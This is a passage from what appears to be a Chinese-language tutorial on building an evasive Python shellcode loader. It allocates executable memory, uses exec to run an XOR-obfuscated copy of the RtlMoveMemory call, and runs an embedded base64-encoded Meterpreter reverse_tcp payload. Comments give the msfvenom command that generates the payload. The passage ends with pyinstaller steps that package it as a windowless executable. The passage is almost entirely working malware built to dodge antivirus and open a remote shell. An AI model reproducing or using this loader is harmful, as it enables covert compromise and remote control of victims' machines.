    #由于Pyhon在申请内存的时候默认是使用32位的，x86和x64的兼容性问题导致了内存不可写，如果系统是64位的，就要加上下面的语句
    #返回值类型为C 64位 unsigned int  范围0~4294967295(范围4字节)
    ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
    #分配内存，起始地址为0，区域大小为len(shellcode)个字节,分配类型为MEM_COMMIT(0x1000) 和 MEM_RESERVE(0x2000)，权限为PAGE_EXECUTE_READWRITE 该区域可以执行代码，应用程序可以读写该区域。
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
    #funcs为加密字符串，seed为123，解密方式为异或运算,除此之外，还可以使用其它加密（编码）方式对函数加密（编码）
    funcs = '70,208,133,111,226,123,113,146,231,30,133,20,54,203,71,77,230,234,182,55,207,108,203,231,232,79,137,160,182,180,203,54,84,167,78,235,21,203,131,209,183,25,202,144,179,84,168,137,158,181,33,136,154,102,166,98,8,179,139,242,251,26,1,178,19,125,22,209,56,51,119,41,229,118,164,182,74,178,157,53,248,183,48,58,66,179,109,168,30,182,106,60,119,170,147,57,73,4,41,221,62,148,2,9,60,188,167,47,194,232,35,141,240,193,78,169,122,86'
    #对funcs进行解密
    func = fs_decode(funcs)
    #执行被解密的函数，在RtlMoveMemory加上64位的类型：
    #ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
    exec(func)
    #创建进程调用CreateThread，将在主线程的基础上创建一个新的线程
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

if __name__ == '__main__':
    #msf生成base64编码过的shellcode,格式：
    #msfvenom -p /windows/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port]  --encrypt=base64 -f c
    #复制生成的shellcode
    ShellCode = '''"\x2f\x45\x69\x44\x35\x50\x44\x6f\x7a\x41\x41\x41\x41\x45\x46"
"\x52\x51\x56\x42\x53\x53\x44\x48\x53\x5a\x55\x69\x4c\x55\x6d"
"\x42\x49\x69\x31\x49\x59\x55\x55\x69\x4c\x55\x69\x42\x57\x53"
"\x49\x74\x79\x55\x45\x30\x78\x79\x55\x67\x50\x74\x30\x70\x4b"
"\x53\x44\x48\x41\x72\x44\x78\x68\x66\x41\x49\x73\x49\x45\x48"
"\x42\x79\x51\x31\x42\x41\x63\x48\x69\x37\x56\x4a\x49\x69\x31"
"\x49\x67\x69\x30\x49\x38\x53\x41\x48\x51\x5a\x6f\x46\x34\x47"
"\x41\x73\x43\x51\x56\x45\x50\x68\x58\x49\x41\x41\x41\x43\x4c"
"\x67\x49\x67\x41\x41\x41\x42\x49\x68\x63\x42\x30\x5a\x30\x67"
"\x42\x30\x49\x74\x49\x47\x45\x53\x4c\x51\x43\x42\x51\x53\x51"
"\x48\x51\x34\x31\x5a\x4e\x4d\x63\x6c\x49\x2f\x38\x6c\x42\x69"
"\x7a\x53\x49\x53\x41\x48\x57\x53\x44\x48\x41\x51\x63\x48\x4a"
"\x44\x61\x78\x42\x41\x63\x45\x34\x34\x48\x58\x78\x54\x41\x4e"
"\x4d\x4a\x41\x68\x46\x4f\x64\x46\x31\x32\x46\x68\x45\x69\x30"
"\x41\x6b\x53\x51\x48\x51\x5a\x6b\x47\x4c\x44\x45\x68\x45\x69"
"\x30\x41\x63\x53\x51\x48\x51\x51\x59\x73\x45\x69\x45\x46\x59"
"\x51\x56\x68\x49\x41\x64\x42\x65\x57\x56\x70\x42\x57\x45\x46"
"\x5a\x51\x56\x70\x49\x67\x2b\x77\x67\x51\x56\x4c\x2f\x34\x46"
"\x68\x42\x57\x56\x70\x49\x69\x78\x4c\x70\x53\x2f\x2f\x2f\x2f"
"\x31\x31\x4a\x76\x6e\x64\x7a\x4d\x6c\x38\x7a\x4d\x67\x41\x41"
"\x51\x56\x5a\x4a\x69\x65\x5a\x49\x67\x65\x79\x67\x41\x51\x41"
"\x41\x53\x59\x6e\x6c\x53\x62\x77\x43\x41\x41\x2b\x67\x77\x4b"
"\x6a\x39\x5a\x45\x46\x55\x53\x59\x6e\x6b\x54\x49\x6e\x78\x51"
"\x62\x70\x4d\x64\x79\x59\x48\x2f\x39\x56\x4d\x69\x65\x70\x6f"
"\x41\x51\x45\x41\x41\x46\x6c\x42\x75\x69\x6d\x41\x61\x77\x44"
"\x2f\x31\x57\x6f\x4b\x51\x56\x35\x51\x55\x45\x30\x78\x79\x55"
"\x30\x78\x77\x45\x6a\x2f\x77\x45\x69\x4a\x77\x6b\x6a\x2f\x77"
"\x45\x69\x4a\x77\x55\x47\x36\x36\x67\x2f\x66\x34\x50\x2f\x56"
"\x53\x49\x6e\x48\x61\x68\x42\x42\x57\x45\x79\x4a\x34\x6b\x69"
"\x4a\x2b\x55\x47\x36\x6d\x61\x56\x30\x59\x66\x2f\x56\x68\x63"
"\x42\x30\x43\x6b\x6e\x2f\x7a\x6e\x58\x6c\x36\x4a\x4d\x41\x41"
"\x41\x42\x49\x67\x2b\x77\x51\x53\x49\x6e\x69\x54\x54\x48\x4a"
"\x61\x67\x52\x42\x57\x45\x69\x4a\x2b\x55\x47\x36\x41\x74\x6e"
"\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41\x66\x6c\x56\x49\x67\x38"
"\x51\x67\x58\x6f\x6e\x32\x61\x6b\x42\x42\x57\x57\x67\x41\x45"
"\x41\x41\x41\x51\x56\x68\x49\x69\x66\x4a\x49\x4d\x63\x6c\x42"
"\x75\x6c\x69\x6b\x55\x2b\x58\x2f\x31\x55\x69\x4a\x77\x30\x6d"
"\x4a\x78\x30\x30\x78\x79\x55\x6d\x4a\x38\x45\x69\x4a\x32\x6b"
"\x69\x4a\x2b\x55\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67"
"\x2f\x67\x41\x66\x53\x68\x59\x51\x56\x64\x5a\x61\x41\x42\x41"
"\x41\x41\x42\x42\x57\x47\x6f\x41\x57\x6b\x47\x36\x43\x79\x38"
"\x50\x4d\x50\x2f\x56\x56\x31\x6c\x42\x75\x6e\x56\x75\x54\x57"
"\x48\x2f\x31\x55\x6e\x2f\x7a\x75\x6b\x38\x2f\x2f\x2f\x2f\x53"
"\x41\x48\x44\x53\x43\x6e\x47\x53\x49\x58\x32\x64\x62\x52\x42"
"\x2f\x2b\x64\x59\x61\x67\x42\x5a\x53\x63\x66\x43\x38\x4c\x57"
"\x69\x56\x76\x2f\x56"'''
    keys = 'Axx8'     #keys用于加密与解密，可以修改
    #将双引号去掉，将换行符去掉,并进行编码，seed为keys
    shell_code = encode(ShellCode.replace('"', '').replace('\n', ''),keys)
    #上一步得到的shell_code为字符串，接下来再对shellcode进行解密
    shellcode = decode(shell_code,keys)
    
    #由于shellcode经过base64编码，所以这里需要解码一下，返回byte字符串，如b'\xfcH\x83\xe4...'
    shellcode = base64.b64decode(shellcode)
    #run shellcode
    run(shellcode)


```

```powershell
#最终在当前路径生成shellcode.exe
#python3
python -m pip install pyinstaller   
pyinstaller -F -w shellcode.py
```

